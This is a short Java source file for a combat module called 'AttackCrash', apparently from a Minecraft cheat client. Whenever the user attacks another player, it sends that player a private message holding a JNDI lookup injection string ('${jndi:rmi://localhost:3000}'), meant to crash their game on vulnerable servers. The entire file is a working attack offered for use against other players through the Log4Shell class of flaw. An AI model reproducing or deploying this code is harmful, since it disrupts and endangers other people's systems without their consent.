/*
 Copyright Alan Wood 2021
 None of this code to be reused without my written permission
 Intellectual Rights owned by Alan Wood
 */
package dev.rise.module.impl.combat;

import dev.rise.event.impl.other.AttackEvent;
import dev.rise.module.Module;
import dev.rise.module.api.ModuleInfo;
import dev.rise.module.enums.Category;
import dev.rise.util.math.TimeUtil;
import net.minecraft.entity.player.EntityPlayer;

@ModuleInfo(name = "AttackCrash", description = "Crashes other peoples games upon attacking them on some servers", category = Category.COMBAT)
public final class AttackCrash extends Module {

    private final TimeUtil timer = new TimeUtil();

    @Override
    public void onAttackEvent(final AttackEvent event) {
        if (event.getTarget() instanceof EntityPlayer && timer.hasReached(1000L)) {
            final EntityPlayer player = (EntityPlayer) event.getTarget();
            mc.thePlayer.sendChatMessage("/msg " + player.getName() + " ${jndi:rmi://localhost:3000}");
            timer.reset();
        }
    }
}
